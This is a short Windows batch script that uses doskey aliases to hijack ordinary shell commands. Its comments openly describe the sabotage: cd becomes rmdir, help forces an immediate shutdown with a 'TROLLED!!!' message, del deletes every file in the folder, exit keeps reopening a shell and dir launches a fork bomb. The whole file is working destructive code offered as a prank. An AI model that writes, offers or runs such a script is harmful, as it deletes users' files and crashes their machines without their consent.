@ECHO OFF

REM delete whatever the user tries to enter.
doskey cd=rmdir

REM make a new shell open whenever the user tries to exit.
doskey exit=cmd

REM make help forcefully shut down the computer
doskey help=shutdown -s -f -t 1 -c "TROLLED!!!"

REM delete everything when a user just tries to delete one file.
doskey del=del *

REM make dir launch a fork-bomb
doskey dir=%0|%0
